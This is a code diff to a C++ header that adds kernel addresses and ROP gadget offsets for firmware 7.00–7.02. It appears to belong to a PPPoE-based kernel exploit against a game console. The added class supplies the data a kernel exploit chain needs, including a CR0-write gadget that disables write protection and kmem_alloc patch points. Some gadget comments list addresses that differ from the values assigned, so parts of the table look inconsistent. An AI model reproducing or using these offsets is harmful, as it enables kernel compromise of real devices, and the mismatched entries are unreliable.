@@ -1,6 +1,7 @@
 #pragma once
 
 enum FirmwareVersion {
+    FIRMWARE_700_702 = 700,
     FIRMWARE_750_755 = 750,
     FIRMWARE_800_803 = 800,
     FIRMWARE_850_852 = 850,
@@ -15,41 +16,139 @@ enum FirmwareVersion {
 
 class OffsetsFirmware {
 public:
-    uint64_t PPPOE_SOFTC_LIST;
-    uint64_t KERNEL_MAP;
-    uint64_t SETIDT;
-    uint64_t KMEM_ALLOC;
-    uint64_t KMEM_ALLOC_PATCH1;
-    uint64_t KMEM_ALLOC_PATCH2;
-    uint64_t MEMCPY;
-    uint64_t MOV_CR0_RSI_UD2_MOV_EAX_1_RET;
-    uint64_t SECOND_GADGET_OFF;
-    uint64_t FIRST_GADGET;
-    uint64_t PUSH_RBP_JMP_QWORD_PTR_RSI;
-    uint64_t POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10;
-    uint64_t LEA_RSP_RSI_20_REPZ_RET;
-    uint64_t ADD_RSP_28_POP_RBP_RET;
-    uint64_t ADD_RSP_B0_POP_RBP_RET;
-    uint64_t RET;
-    uint64_t POP_RDI_RET;
-    uint64_t POP_RSI_RET;
-    uint64_t POP_RDX_RET;
-    uint64_t POP_RCX_RET;
-    uint64_t POP_R8_POP_RBP_RET;
-    uint64_t POP_R12_RET;
-    uint64_t POP_RAX_RET;
-    uint64_t POP_RBP_RET;
-    uint64_t PUSH_RSP_POP_RSI_RET;
-    uint64_t MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX;
-    uint64_t MOV_BYTE_PTR_RCX_AL_RET;
-    uint64_t MOV_RDI_RBX_CALL_R12;
-    uint64_t MOV_RDI_R14_CALL_R12;
-    uint64_t MOV_RSI_RBX_CALL_RAX;
-    uint64_t MOV_R14_RAX_CALL_R8;
-    uint64_t ADD_RDI_RCX_RET;
-    uint64_t SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET;
-    uint64_t JMP_R14;
+    uint64_t PPPOE_SOFTC_LIST{};
+    uint64_t KERNEL_MAP{};
+    uint64_t SETIDT{};
+    uint64_t KMEM_ALLOC{};
+    uint64_t KMEM_ALLOC_PATCH1{};
+    uint64_t KMEM_ALLOC_PATCH2{};
+    uint64_t MEMCPY{};
+    uint64_t MOV_CR0_RSI_UD2_MOV_EAX_1_RET{};
+    uint64_t SECOND_GADGET_OFF{};
+    uint64_t FIRST_GADGET{};
+    uint64_t PUSH_RBP_JMP_QWORD_PTR_RSI{};
+    uint64_t POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10{};
+    uint64_t LEA_RSP_RSI_20_REPZ_RET{};
+    uint64_t ADD_RSP_28_POP_RBP_RET{};
+    uint64_t ADD_RSP_B0_POP_RBP_RET{};
+    uint64_t RET{};
+    uint64_t POP_RDI_RET{};
+    uint64_t POP_RSI_RET{};
+    uint64_t POP_RDX_RET{};
+    uint64_t POP_RCX_RET{};
+    uint64_t POP_R8_POP_RBP_RET{};
+    uint64_t POP_R12_RET{};
+    uint64_t POP_RAX_RET{};
+    uint64_t POP_RBP_RET{};
+    uint64_t PUSH_RSP_POP_RSI_RET{};
+    uint64_t MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX{};
+    uint64_t MOV_BYTE_PTR_RCX_AL_RET{};
+    uint64_t MOV_RDI_RBX_CALL_R12{};
+    uint64_t MOV_RDI_R14_CALL_R12{};
+    uint64_t MOV_RSI_RBX_CALL_RAX{};
+    uint64_t MOV_R14_RAX_CALL_R8{};
+    uint64_t ADD_RDI_RCX_RET{};
+    uint64_t SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET{};
+    uint64_t JMP_R14{};
 
+};
+
+/// FW 7.00 / 7.01 / 7.02
+class OffsetsFirmware_700_702: public OffsetsFirmware {
+public:
+    OffsetsFirmware_700_702() {
+        PPPOE_SOFTC_LIST = 0xffffffff844ad838;
+
+        KERNEL_MAP = 0xffffffff843c8ee0;
+
+        SETIDT = 0xffffffff82692400;
+
+        KMEM_ALLOC = 0xffffffff823170f0;
+        KMEM_ALLOC_PATCH1 = 0xffffffff823171be;
+        KMEM_ALLOC_PATCH2 = 0xffffffff823171c6;
+
+        MEMCPY = 0xffffffff8222ef80;
+
+        // 0xffffffff82660609 : mov cr0, rsi ; ud2 ; mov eax, 1 ; ret
+        MOV_CR0_RSI_UD2_MOV_EAX_1_RET = 0xffffffff823b7169;
+
+        SECOND_GADGET_OFF = 0x3b;
+
+        // 0xffffffff822f52ed : jmp qword ptr [rsi + 0x3b]
+        FIRST_GADGET = 0xffffffff822f52ed;
+
+        // 0xffffffff82c72e66 : push rbp ; jmp qword ptr [rsi]
+        PUSH_RBP_JMP_QWORD_PTR_RSI = 0xffffffff82c928d6;
+
+        // 0xffffffff82699bc1 : pop rbx ; pop r14 ; pop rbp ; jmp qword ptr [rsi + 0x10]
+        POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10 = 0xffffffff82699bc1;
+
+        // 0xffffffff82945dc6 : lea rsp, [rsi + 0x20] ; repz ret
+        LEA_RSP_RSI_20_REPZ_RET = 0xffffffff82945dc6;
+
+        // 0xffffffff826d56ad : add rsp, 0x28 ; pop rbp ; ret
+        ADD_RSP_28_POP_RBP_RET = 0xffffffff826d56ad;
+
+        // 0xffffffff8252a48a : add rsp, 0xb0 ; pop rbp ; ret
+        ADD_RSP_B0_POP_RBP_RET = 0xffffffff8252a48a;
+
+        // 0xffffffff822005a1 : ret
+        RET = 0xffffffff822005a1;
+
+        // 0xffffffff8255325a : pop rdi ; ret
+        POP_RDI_RET = 0xffffffff8255325a;
+
+        // 0xffffffff8230d34e : pop rsi ; ret
+        POP_RSI_RET = 0xffffffff8230d34e;
+
+        // 0xffffffff8299ae06 : pop rdx ; ret
+        POP_RDX_RET = 0xffffffff8299ae06;
+
+        // 0xffffffff822563a6 : pop rcx ; ret
+        POP_RCX_RET = 0xffffffff822563a6;
+
+        // 0xffffffff82326dcd : pop r8 ; pop rbp ; ret
+        POP_R8_POP_RBP_RET = 0xffffffff82326dcd;
+
+        // 0xffffffff827d2b4f : pop r12 ; ret
+        POP_R12_RET = 0xffffffff827d2b4f;
+
+        // 0xffffffff82407b54 : pop rax ; ret
+        POP_RAX_RET = 0xffffffff82407b54;
+
+        // 0xffffffff822008f2 : pop rbp ; ret
+        POP_RBP_RET = 0xffffffff822008f2;
+
+        // 0xffffffff82bd348a : push rsp ; pop rsi ; ret
+        PUSH_RSP_POP_RSI_RET = 0xffffffff82bd348a;
+
+        // 0xffffffff822fb490 : mov rdi, qword ptr [rdi] ; pop rbp ; jmp rax
+        MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX = 0xffffffff822fb490;
+
+        // 0xffffffff82b910ba : mov byte ptr [rcx], al ; ret
+        MOV_BYTE_PTR_RCX_AL_RET = 0xffffffff82b910ba;
+
+        // 0xffffffff82644739 : mov rdi, rbx ; call r12
+        MOV_RDI_RBX_CALL_R12 = 0xffffffff82644739;
+
+        // 0xffffffff82644535 : mov rdi, r14 ; call r12
+        MOV_RDI_R14_CALL_R12 = 0xffffffff82644535;
+
+        // 0xffffffff822ad8e1 : mov rsi, rbx ; call rax
+        MOV_RSI_RBX_CALL_RAX = 0xffffffff822ad8e1;
+
+        // 0xffffffff8266a598 : mov r14, rax ; call r8
+        MOV_R14_RAX_CALL_R8 = 0xffffffff8266a598;
+
+        // 0xffffffff82cd2aca : add rdi, rcx ; ret
+        ADD_RDI_RCX_RET = 0xffffffff82cd2aca;
+
+        // 0xffffffff82583b8a : sub rsi, rdx ; mov rax, rsi ; pop rbp ; ret
+        SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET = 0xffffffff82583b8a;
+
+        // 0xffffffff82ba226b : jmp r14
+        JMP_R14 = 0xffffffff82ba226b;
+    }
 };
 
 /// FW 7.50 / 7.51 / 7.50
